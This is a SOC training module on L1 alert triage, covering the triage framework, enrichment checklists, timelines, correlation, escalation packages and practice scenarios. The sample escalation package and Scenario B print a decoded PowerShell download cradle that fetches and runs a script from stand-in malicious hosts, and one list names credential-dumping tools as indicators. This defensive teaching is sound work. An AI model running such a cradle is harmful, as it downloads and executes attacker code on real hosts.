# Module 2: Alert Triage Methodology

**Priority: P0 — THE core L1 skill. Master this completely.**

---

## 2.1 The Triage Mindset

> **Triage (noun)**: *The process of determining the priority of patients' treatments based on the severity of their condition.*

In SOC: **Rapidly classify alerts to spend time on what matters.**

### The Golden Rule
> **Every alert deserves context. No alert deserves assumption.**

### L1 Triage Time Budget
| Alert Type | Target Time | Max Time |
|------------|-------------|----------|
| P1/Critical | 5-10 min | 15 min |
| P2/High | 10-20 min | 30 min |
| P3/Medium | 20-30 min | 45 min |
| P4/Low | Batch review | 60 min |

**If you exceed max time → Escalate with "inconclusive, needs deeper investigation"**

---

## 2.2 The 20-Question Triage Framework

For **EVERY alert**, systematically answer:

| # | Question | Source | Why It Matters |
|---|----------|--------|----------------|
| 1 | **What triggered it?** | Alert detail, rule name, detection logic | Understand the hypothesis |
| 2 | **Which asset is involved?** | Hostname, IP, cloud resource ID | Asset criticality, ownership |
| 3 | **Which user is involved?** | Username, SID, UPN, email | Privilege level, department, risk |
| 4 | **What happened?** | Event description, MITRE technique | Behavioral context |
| 5 | **When did it happen?** | Timestamp, timezone, duration | Timeline, correlation window |
| 6 | **What process caused it?** | Image path, PID, hash, command line | Execution context |
| 7 | **What parent process spawned it?** | Parent image, parent PID, parent command line | Process tree, living-off-land |
| 8 | **What command line was executed?** | Full command line, encoded args | Intent, obfuscation, IOCs |
| 9 | **What network connections occurred?** | Src/Dst IP:Port, protocol, direction, bytes | C2, lateral, exfil, beaconing |
| 10 | **What files were created/modified?** | Path, hash, size, entropy, signature | Malware, staging, persistence |
| 11 | **What authentication occurred?** | Logon type, source, target, result | Credential theft, lateral, brute force |
| 12 | **What happened BEFORE the alert?** | 30-60 min prior timeline | Initial access, staging |
| 13 | **What happened AFTER the alert?** | 30-60 min post timeline | Execution, persistence, C2 |
| 14 | **Is there evidence of persistence?** | Run keys, services, tasks, WMI, startup | Foothold maintenance |
| 15 | **Is there lateral movement?** | SMB, RDP, WinRM, SSH, Pass-the-Hash | Spread |
| 16 | **Is there C2 communication?** | Beaconing, domain gen, unusual ports, TLS anomalies | Command channel |
| 17 | **Is there data exfiltration?** | Large uploads, cloud storage, archive creation | Data theft |
| 18 | **Classification: Malicious / Benign / Inconclusive?** | Evidence-based decision | Drives action |
| 19 | **What evidence supports the conclusion?** | Specific logs, hashes, IPs, behavior | Defensible, auditable |
| 20 | **Should it be escalated?** | Severity, confidence, asset criticality, SLA | Next step |

---

## 2.3 Alert Enrichment Checklist

### User Context (AD / Entra ID / HR)
- [ ] Department, title, manager
- [ ] Group memberships (Domain Admins? VPN users? Service accounts?)
- [ ] Last password change, MFA status, risky sign-ins
- [ ] Recent travel, impossible travel alerts
- [ ] Terminated? On leave? Contractor?

### Asset Context (CMDB / EDR / Vuln Mgmt)
- [ ] Role: DC, File Server, Workstation, Laptop, Kiosk, IoT
- [ ] Criticality: Tier 0/1/2/3
- [ ] OS, patch level, EDR status (active? healthy? tampered?)
- [ ] Installed software (Office? Python? Remote admin tools?)
- [ ] Recent alerts, vulnerability findings
- [ ] Network segment (DMZ, Internal, Cloud, OT)

### Process Context (EDR / Sysmon)
- [ ] Full process tree (3+ levels up)
- [ ] Command line (decoded if encoded)
- [ ] Parent process legitimacy (signed? expected parent?)
- [ ] Hash reputation (VT, internal allowlist, NSRL)
- [ ] MITRE tags on process behavior
- [ ] Child processes spawned

### Network Context (NDR / Proxy / Firewall / DNS)
- [ ] Destination IP reputation (malicious, suspicious, benign, unknown)
- [ ] Domain reputation, age, registrar, hosting provider
- [ ] Connection pattern: single, burst, periodic (beaconing)
- [ ] Protocol anomalies: HTTP on 443, DNS over HTTPS, non-standard ports
- [ ] TLS fingerprint (JA3), SNI, certificate details
- [ ] Bytes transferred, direction, duration

### Authentication Context (AD / VPN / Cloud / MFA)
- [ ] Logon type (2=Interactive, 3=Network, 4=Batch, 5=Service, 7=Unlock, 8=NetworkCleartext, 9=NewCredentials, 10=RemoteInteractive, 11=CachedInteractive)
- [ ] Source IP, workstation name
- [ ] Success/Failure (0x0, 0xC000006A, 0xC000006D, 0xC000006F, 0xC0000070, 0xC0000072, 0xC000015B, 0xC000018C, 0xC000019B, 0xC0000224, 0xC0000225, 0xC0000234, 0xC00002EE)
- [ ] MFA challenge/result
- [ ] Impossible travel, new device, anonymous IP

### Threat Intelligence Enrichment
- [ ] IP reputation (AbuseIPDB, AlienVault, internal TIP, VT)
- [ ] Domain reputation (age, passive DNS, hosting, registrar)
- [ ] Hash reputation (VT, Hybrid Analysis, MalwareBazaar, internal)
- [ ] Actor/campaign association
- [ ] MITRE technique mapping
- [ ] Confidence score, TLP marking

---

## 2.4 Context Gathering Workflow

```
ALERT RECEIVED
      │
      ▼
┌─────────────────────────────────────┐
│  1. PARSE ALERT METADATA            │
│  - Rule name, severity, timestamp   │
│  - Entities: host, user, process, IP│
└─────────────────────┬───────────────┘
                      ▼
┌─────────────────────────────────────┐
│  2. AUTOMATED ENRICHMENT (SOAR)     │
│  - TI lookup (IP, domain, hash)     │
│  - Asset info (CMDB, EDR)           │
│  - User info (AD, HR)               │
│  - Recent alerts (same host/user)   │
└─────────────────────┬───────────────┘
                      ▼
┌─────────────────────────────────────┐
│  3. MANUAL DEEP DIVE (Time-boxed)   │
│  - Process tree + command lines     │
│  - Network connections + reputation │
│  - File/registry artifacts          │
│  - Authentication timeline          │
│  - Pre/Post 60-min timeline         │
└─────────────────────┬───────────────┘
                      ▼
┌─────────────────────────────────────┐
│  4. CLASSIFY & DECIDE               │
│  - TP: Escalate with package        │
│  - FP: Close, document, tune rule   │
│  - BP: Close, document context      │
│  - Inconclusive: Extend / Escalate  │
└─────────────────────┬───────────────┘
                      ▼
┌─────────────────────────────────────┐
│  5. DOCUMENT & HANDOFF              │
│  - Case notes with evidence         │
│  - MITRE mapping                    │
│  - Severity/Priority                │
│  - Recommended actions              │
└─────────────────────────────────────┘
```

---

## 2.5 Timeline Construction

### Why Timeline Matters
- **Causality**: What caused what?
- **Scope**: How far did it spread?
- **Root cause**: Where did it start?
- **Attribution**: Actor behavior patterns

### Timeline Granularity
| Phase | Window | Focus |
|-------|--------|-------|
| **Immediate** | T-5min to T+5min | Alert trigger, process execution, network conn |
| **Tactical** | T-60min to T+60min | Initial access, staging, lateral, persistence |
| **Operational** | T-24h to T+24h | Campaign pattern, repeated access, data staging |
| **Strategic** | Days/Weeks | Dwell time, actor infrastructure, full kill chain |

### Timeline Sources (Prioritized)
1. **EDR** — Process, file, registry, network, memory (highest fidelity)
2. **Sysmon** — Process create, network, file, registry, DNS, image load
3. **Windows Security Log** — Auth (4624/4625), process (4688), audit policy changes
4. **NDR/Proxy/Firewall** — Network flows, DNS, HTTP, TLS metadata
5. **Cloud/Identity** — Sign-ins, API calls, resource changes
6. **Email** — Delivery, clicks, attachments
7. **Vuln Scanner** — Recent scans (explain vuln scan alerts)

### Building a Timeline (Practical)
```
1. Query: "Show all events for host X from T-60 to T+60"
2. Filter: Remove noise (heartbeats, routine updates, health checks)
3. Tag: Color-code by type (Auth=Blue, Process=Green, Net=Red, File=Yellow)
4. Annotate: Mark alert trigger, suspicious nodes, gaps
5. Narrative: "At 03:12, user clicked link → 03:13 PowerShell download → 03:14 C2 beacon"
```

---

## 2.6 Correlation: Connecting the Dots

### Types of Correlation
| Type | Example | L1 Action |
|------|---------|-----------|
| **Same Host** | Alert A (PowerShell) + Alert B (C2 IP) same host | Merge into single case |
| **Same User** | Failed VPN → Success VPN → Suspicious mailbox access | Track user journey |
| **Same IP** | Multiple hosts beaconing to same C2 | Campaign detection |
| **Same Technique** | Scheduled task creation on 5 hosts in 1 hour | Cluster → Hunt |
| **Kill Chain** | Phishing → Credential theft → VPN → Lateral → Exfil | Full incident |

### Correlation in Practice
```
Alert: "Suspicious PowerShell - Encoded Command"
Host: WORKSTN-047
User: j.smith

CORRELATION CHECKS:
☐ Other alerts on WORKSTN-047 in 24h?
☐ Other alerts for j.smith in 24h?
☐ Other hosts with same PowerShell command?
☐ Same C2 IP in other alerts?
☐ Recent phishing emails to j.smith?
☐ VPN logs for j.smith?
☐ File shares accessed by j.smith?
```

---

## 2.7 Evidence Collection for Escalation

### The "Escalation Package" — What L2 Needs
```
┌────────────────────────────────────────────────────────────┐
│ ESCALATION PACKAGE: INC-2024-001234                        │
├────────────────────────────────────────────────────────────┤
│ ALERT: Suspicious PowerShell - Encoded Command (P2)       │
│ HOST: WORKSTN-047 (Marketing, Tier 2)                     │
│ USER: j.smith@company.com (Standard user, MFA enabled)    │
│ TIME: 2024-01-15 03:12:47 UTC                              │
├────────────────────────────────────────────────────────────┤
│ PROCESS TREE:                                              │
│ WINWORD.EXE (PID 4521)                                     │
│  └── POWERSHELL.EXE (PID 5102) -enc "JABjAGwA..."         │
│       └── CMD.EXE (PID 5188) /c whoami                     │
│       └── POWERSHELL.EXE (PID 5201) IEX (Download...)      │
├────────────────────────────────────────────────────────────┤
│ DECODED COMMAND:                                           │
│ IEX (New-Object Net.WebClient).DownloadString(             │
│   'http://malicious-domain.com/payload.ps1')               │
├────────────────────────────────────────────────────────────┤
│ NETWORK:                                                   │
│ 03:12:49 TCP 10.10.20.47:52311 → 203.0.113.45:80 (HTTP)  │
│ 03:13:02 TLS 10.10.20.47:52315 → 203.0.113.45:443 (JA3:  │
│   a0e9f5d64349fb13191bc781f81f42e1) SNI: malicious-domain.com│
├────────────────────────────────────────────────────────────┤
│ FILE ARTIFACTS:                                            │
│ C:\Users\jsmith\AppData\Local\Temp\payload.ps1 (SHA256:   │
│   a1b2c3d4... VT: 42/72 Trojan.Downloader)                │
├────────────────────────────────────────────────────────────┤
│ AUTHENTICATION:                                            │
│ 03:10:22 4624 Logon Type 10 (RDP) from 10.10.10.50        │
│ 03:11:05 4624 Logon Type 3 (Network) from 10.10.10.50     │
├────────────────────────────────────────────────────────────┤
│ THREAT INTEL:                                              │
│ IP 203.0.113.45: VT 15/92 (C2, Cobalt Strike),            │
│   AbuseIPDB 89% confidence, associated with APT29         │
│ Domain malicious-domain.com: Registered 2024-01-10,        │
│   Namecheap, hosted on Bulletproof Hosting AS12345         │
├────────────────────────────────────────────────────────────┤
│ CLASSIFICATION: TRUE POSITIVE                              │
│ EVIDENCE: Decoded cmd → malicious download → C2 beacon →  │
│   known bad IP/domain → malware hash                       │
│ MITRE: T1059.001, T1105, T1071.001, T1055                 │
│ SEVERITY: P2 (Active C2, user workstation, no lateral yet)│
│ RECOMMENDED: Isolate host, block IP/domain, disable user,  │
│   escalate to L2 for memory forensics                      │
└────────────────────────────────────────────────────────────┘
```

---

## 2.8 Classification Decision Matrix

```
                    ┌─────────────────────┐
                    │   EVIDENCE LEVEL    │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                ▼
       ┌────────────┐   ┌────────────┐   ┌────────────┐
       │  STRONG    │   │  MODERATE  │   │  WEAK/     │
       │  MALICIOUS │   │  SUSPICIOUS│   │  NONE      │
       │  INDICATORS│   │  INDICATORS│   │  INDICATORS│
       └─────┬──────┘   └─────┬──────┘   └─────┬──────┘
             │                │                │
             ▼                ▼                ▼
       ┌────────────┐   ┌────────────┐   ┌────────────┐
       │ TRUE       │   │ INCONCLUSIVE│  │ FALSE /    │
       │ POSITIVE   │   │ (Time-box   │  │ BENIGN     │
       │            │   │  extend,    │  │ POSITIVE   │
       │ ESCALATE   │   │ gather more)│  │            │
       └────────────┘   └────────────┘   └────────────┘
```

### Strong Malicious Indicators (→ True Positive)
- Known malicious hash/IP/domain (high-confidence TI)
- Decoded command downloads/executes payload
- C2 beaconing pattern (regular interval, long-lived)
- Credential dumping tools (mimikatz, sekurlsa, comsvcs.dll)
- Persistence artifacts (Run keys, services, WMI, scheduled tasks)
- Lateral movement evidence (SMB admin$, RDP, Pass-the-Hash)
- Ransomware behavior (mass encryption, ransom notes)

### Moderate Suspicious Indicators (→ Inconclusive → Deepen)
- Encoded PowerShell without clear payload
- Rare but not known-bad process execution
- Unusual network connection (new geo, rare port)
- Single failed login anomaly
- Unsigned script execution
- Living-off-land binary (LOLBins) with odd args

### Weak/No Indicators (→ False Positive / Benign Positive)
- Vulnerability scanner source IP
- Admin running authorized script
- Software update / patch deployment
- Legitimate admin tool (PSExec, ADFind, BloodHound) by known admin
- Backup agent, monitoring agent behavior
- False positive pattern documented in runbook

---

## 2.9 Root Cause Analysis Basics (L1 Level)

**L1 does NOT do full RCA. L1 identifies *probable* root cause for escalation.**

### 5 Whys for SOC (Simplified)
```
Alert: PowerShell encoded command
Why? → Word spawned PowerShell
Why? → User opened malicious document
Why? → Phishing email delivered
Why? → Email gateway missed it
Why? → Signature not updated / Zero-day
→ Root cause: Phishing delivery gap
```

### L1 Root Cause Categories
| Category | Indicators | Escalation Note |
|----------|------------|-----------------|
| **Phishing** | Email → Click → Execution | Include email headers, URL, attachment hash |
| **Drive-by / Web** | Browser → Download → Execution | Proxy logs, referrer, URL reputation |
| **Valid Account** | VPN/RDP → Recon → Lateral | Source IP, geo, MFA status, password age |
| **Exploit** | Public-facing app → Shell → Persistence | WAF logs, vuln scan, patch status |
| **Supply Chain** | Trusted software → Malicious update | Vendor advisory, hash mismatch |
| **Insider** | Data access → Staging → Exfil | HR context, DLP alerts, access justification |

---

## 2.10 Common Triage Pitfalls

| Pitfall | Symptom | Fix |
|---------|---------|-----|
| **Alert fatigue closing** | "Seen this 100x, must be FP" | Every alert: fresh enrichment, check for changes |
| **Single-source reliance** | Only checked EDR, missed NDR auth | Always check: Endpoint + Network + Auth + Email |
| **No timeline** | "Alert at 03:00, what happened before?" | Mandatory T-60/T+60 query |
| **Shallow process analysis** | "PowerShell ran" (no tree, no cmdline) | Always: Parent, Command Line, Children, Hash |
| **Ignoring asset criticality** | Same triage for DC and kiosk | Tier 0/1 assets: lower threshold, faster escalation |
| **No threat intel check** | "IP looks weird" (no VT/AbuseIPDB) | Automated + manual TI on every external indicator |
| **Weak documentation** | "Investigated, looks ok" | Evidence → Conclusion → Action, every time |
| **Escalating without package** | L2 asks "what's the host role?" | Package: host, user, process tree, network, TI, timeline |

---

## 2.11 Practical Triage Scenarios (Mental Reps)

### Scenario A: "Multiple Failed Logins → Success"
```
Alert: 4625 x 15 (03:00-03:05) → 4624 (03:05) from 192.168.1.50
User: svc_backup (Service Account)
Host: FILESRV-01 (Tier 1)

TRIAGE:
1. Source IP: Internal (192.168.1.50) → Check host
2. 192.168.1.50 = BACKUP-SRV → Legitimate backup server?
3. Check svc_backup: Password never expires? Last change 2020?
4. Backup job schedule: Runs 03:00 daily?
5. Logon Type: 4 (Batch) or 5 (Service)?
6. If Batch/Service + scheduled → BENIGN POSITIVE (document)
7. If Interactive (2) or Network (3) + unusual time → TRUE POSITIVE
```

### Scenario B: "PowerShell from Word"
```
Alert: WINWORD.EXE → POWERSHELL.EXE -enc ...
Host: WORKSTN-088 (Finance)
User: a.chen@company.com

TRIAGE:
1. Process tree: WINWORD → POWERSHELL (suspicious parent)
2. Decode command: IEX (DownloadString 'http://bad.com/x.ps1')
3. Network: PowerShell → 203.0.113.100:80 (HTTP GET /x.ps1)
4. TI: IP = Known C2 (Cobalt Strike), Domain = 2 days old
5. File: %TEMP%\x.ps1 hash = Trojan.Downloader (VT 38/72)
6. Timeline: 03:10 Email received (phish), 03:11 Doc opened, 03:12 Alert
7. Classification: TRUE POSITIVE → ESCALATE P1
```

### Scenario C: "RDP from Admin Account at 03:00"
```
Alert: 4624 Logon Type 10 (RDP) User: admin.jdoe Source: 45.33.22.11
Host: DC01 (Tier 0)
Time: 03:15 UTC

TRIAGE:
1. User: Domain Admin? Yes. MFA? Enabled.
2. Source IP: 45.33.22.11 → VPNCORP exit? No → Residential ISP (Comcast)
3. Geo: IP = New York, Admin home = Chicago → Impossible travel?
4. Recent travel? No. VPN log? No VPN session.
5. MFA log: Push accepted at 03:14 from "Microsoft Authenticator"
6. Device: New device? Yes (unknown device fingerprint)
7. Check admin.jdoe: On-call? No. Ticket? No.
8. Classification: TRUE POSITIVE (compromised creds + MFA bypass) → ESCALATE P1
```

---

## 2.12 Triage Runbook Template

```markdown
# RUNBOOK: [Alert Rule Name / MITRE Technique]

## Trigger
- Rule: [Name/ID]
- Severity: [P1-P4]
- MITRE: [TXXXX.XXX]

## Automated Enrichment (SOAR)
- [ ] TI: IP/Domain/Hash reputation
- [ ] Asset: Criticality, Tier, EDR status
- [ ] User: Groups, MFA, Risky sign-ins
- [ ] Recent: Same host/user alerts 24h

## Manual Investigation Steps
1. **Process Tree**: Query EDR for [process] on [host] T-30/T+30
   - Expected: [legitimate parent/children]
   - Suspicious: [known bad patterns]
2. **Command Line**: Full cmdline, decode if encoded
   - Look for: [download cradles, obfuscation, LOLBins]
3. **Network**: Connections from [process] on [host]
   - Check: [beaconing, C2 IPs, data transfer]
4. **Files**: Created/modified by [process]
   - Hash check: [VT, internal allowlist]
5. **Auth**: Logons for [user] on [host] T-60/T+60
   - Types: [interactive, network, RDP, service]
6. **Timeline**: Correlate all above + email/proxy/cloud

## Decision Criteria
| Classification | Criteria | Action |
|----------------|----------|--------|
| TRUE POSITIVE | [Specific evidence] | Escalate P[1-2], contain |
| FALSE POSITIVE | [Known FP pattern] | Close, tune rule |
| BENIGN POSITIVE | [Authorized activity] | Close, document |
| INCONCLUSIVE | [Missing evidence] | Extend 30min, then escalate |

## Escalation Package Template
- Alert details
- Process tree + cmdlines
- Network connections + TI
- File hashes + reputation
- Auth timeline
- MITRE mapping
- Recommended containment
```

---

## 2.13 Interview Questions for This Module

1. **Walk me through your triage process for a "Suspicious PowerShell" alert.**
   - Parse alert → Auto-enrich (TI, asset, user) → Process tree → Decode cmdline → Network → Files → Auth → Timeline → Classify → Package → Escalate/Close

2. **What's the difference between False Positive and Benign Positive?**
   - FP: Alert logic error (no malicious activity). BP: Alert correctly fired on authorized/expected activity (admin script, vuln scan).

3. **An alert shows 20 failed logins then success. How do you triage?**
   - Check source IP (internal vs external), user type (service vs human), logon type, schedule, geo, MFA. Context determines TP/FP/BP.

4. **What is an "escalation package" and what must it contain?**
   - Alert details, process tree, command lines, network connections + TI, file hashes, auth timeline, MITRE mapping, severity, recommended actions.

5. **How do you handle an alert where you can't determine TP/FP in 15 minutes?**
   - Classify "Inconclusive", document what you checked, what's missing, request specific additional data (memory dump, packet capture), escalate to L2 with "needs deeper investigation".

6. **Why is the process tree critical in triage?**
   - Parent process reveals initial access vector (Word → PowerShell = phishing; Services.exe → PowerShell = service exploit; explorer.exe → PowerShell = user execution).

7. **What logon types indicate interactive vs service vs network logon?**
   - 2=Interactive, 3=Network, 4=Batch, 5=Service, 7=Unlock, 10=RemoteInteractive (RDP), 11=CachedInteractive.

---

## 2.14 Study Checklist for Module 2

- [ ] Recite 20-question framework from memory
- [ ] Complete enrichment checklist for user, asset, process, network, auth, TI
- [ ] Build timeline from T-60 to T+60 with color-coded event types
- [ ] Perform correlation checks (same host, user, IP, technique, kill chain)
- [ ] Write escalation package with all required sections
- [ ] Apply classification decision matrix to 5 practice scenarios
- [ ] Identify root cause category for 5 sample alerts
- [ ] Avoid all 8 common triage pitfalls in practice
- [ ] Answer all 7 interview questions without notes

---

*Next: Module 3 — Incident Severity and Escalation*